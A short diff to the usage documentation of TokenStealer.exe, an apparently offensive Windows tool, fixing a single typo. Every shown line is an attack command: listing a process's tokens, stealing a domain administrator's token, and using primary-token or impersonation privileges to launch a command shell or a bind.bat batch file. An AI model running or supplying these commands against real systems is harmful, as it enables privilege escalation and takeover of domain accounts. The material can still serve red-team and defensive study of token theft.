@@ -20,5 +20,5 @@ TokenStealer.exe
 <br><b>TokenStealer.exe -l -p 100 </b>-> list all tokensin process pid 100<br>
 <br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe </b>-> steal token of user and execute an interactive  command shell using the AssingPrimary privilege of available<br>
 <br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\bind.bat  -p 100 -t </b>-> steal token of user in process and execute the batch file using Impersonation privilege instead of AssingPrimary<br>
-<br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -b 1 </b>-> steal a primary token of user and execute an interactive  command shell using the AssingPrimary privilege of available<br>
+<br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -b 1 </b>-> steal a primary token of user and execute an interactive  command shell using the AssingPrimary privilege if available<br>
 
